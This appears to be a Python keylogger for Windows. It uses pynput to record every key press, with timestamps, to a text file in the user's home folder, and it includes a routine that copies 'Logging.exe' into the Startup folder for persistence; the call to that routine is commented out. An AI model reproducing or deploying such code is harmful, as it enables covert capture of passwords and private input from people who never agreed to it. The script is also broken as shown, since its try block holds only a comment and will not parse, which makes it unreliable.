import logging
from pynput.keyboard import Key,Listener
import os
import shutil

def add_to_startup():
    user=os.getlogin()
    location = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(user)
    filename = 'Logging.exe'
    cwd = os.getcwd()
    shutil.copy2(os.path.join(cwd, filename), location)

def on_press(key):
    logging.info(str(key))

def main():
    user=os.getlogin()
    log_dir = r'C:\Users\{}'.format(user)
    logging.basicConfig(filename=os.path.join(log_dir , 'key_log_'+user+'.txt'), level=logging.DEBUG, format='%(asctime)s:%(message)s')
    try:
        #add_to_startup()
    except:
        pass
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__=='__main__':
    main()